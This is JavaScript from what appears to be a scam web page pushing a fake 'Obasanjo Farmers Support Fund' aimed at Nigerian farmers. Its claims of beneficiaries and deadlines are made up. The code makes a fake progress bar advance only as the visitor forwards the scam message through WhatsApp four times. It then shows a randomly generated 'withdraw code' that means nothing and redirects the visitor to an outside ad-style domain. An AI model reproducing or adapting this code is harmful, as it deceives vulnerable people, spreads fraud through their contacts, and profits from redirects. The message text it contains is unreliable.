var number = 0;

            
            j='*OBASANJO FARMERS SUPPORT FUND IS OUT.*%0A%0A*OBASANJO SUPPORT ORGANIZATION(OSO)*%0A%0A is a None Governmental organization which was founded on  July 20th 2020, with Aim to support Nigeria Farmers.*%0A%0A*This Offer Is Available Till 30th December 2021.*.%0A%0A.%0A-So Far, 341407 Nigerians Have Benefited From This Offer. You Can Also Benefit. Apply Now and Follow Instructions.%0A*APPLY HERE*%0A%0Ahttps://obasanjo-farmers-support-fund.github.io/apply/';
            
            function move() {
              var elem = document.getElementById("myBar"); 
              number=number+20;  
            
            
              if (number == 20) {	
                  window.open("whatsapp://send?text=" + j);
                elem.style.width = 20 + '%'; 
                elem.innerHTML = 20 + '%';
                number=20
                
              }
            
              if (number == 40) {
              window.open("whatsapp://send?text=" + j);
                elem.style.width = 40 + '%';
                elem.innerHTML = 40 + '%';
              }
            
              if (number == 60) {
               window.open("whatsapp://send?text=" + j);
                elem.style.width = 60 + '%';
                elem.innerHTML = 60 + '%';
              }
            
             if (number == 80) {
              window.open("whatsapp://send?text=" + j);
                elem.style.width = 80 + '%';
                elem.innerHTML = 80 + '%';
              }
            
              if (number>=100){
                
               window.open("withdrawcode.html","_self");
              }
              
            }



            document.getElementById('wd').innerHTML=withdrawcode(5);
        
            function withdrawcode(code_lenght){
              var code='';
              var chars ='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ12334567890';
              for(var i,i=0;i<code_lenght;i++){
                code +=chars.charAt(Math.floor(Math.random()*chars.length));
              }
              
               return code
            }

            function step2(){
              window.open("//oackoubs.com/4/4594571","_self");
            }

            


